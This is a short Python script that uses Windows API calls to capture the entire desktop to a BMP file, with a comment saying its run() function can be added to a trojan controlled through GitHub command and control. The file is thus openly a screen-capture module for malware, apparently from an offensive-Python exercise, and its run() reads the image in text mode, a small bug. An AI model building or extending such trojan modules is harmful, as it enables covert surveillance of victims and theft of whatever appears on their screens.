import base64
import win32api
import win32con
import win32gui
import win32ui

# Determine the size of the screen.
def get_dimensions():
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return (width, height, left, top)

# The main function.
def screenshot(name='screenshot'):
    # Create a handle for the entire desktop.
    hdesktop = win32gui.GetDesktopWindow()
    width, height, left, top = get_dimensions()

    # Create device context and pass it a handle for the desktop.
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    # Create memory-based device context to store the image until we reach Bitmap.
    mem_dc = img_dc.CreateCompatibleDC()

    # Create Bitmap object that is set to the device context of the desktop.
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    # Use BitBTL function to make a bit-by-bit copy of the image and store it in memory-based context.
    mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    # Dump the image to disk. (Stores the image in current directory with .bmp extension).
    screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

# Can be added to the trojan from (GitHub Command and Control).
def run():
    screenshot()
    with open('screenshot.bmp') as f:
        img = f.read()
    return img

if __name__ == '__main__':
    screenshot()
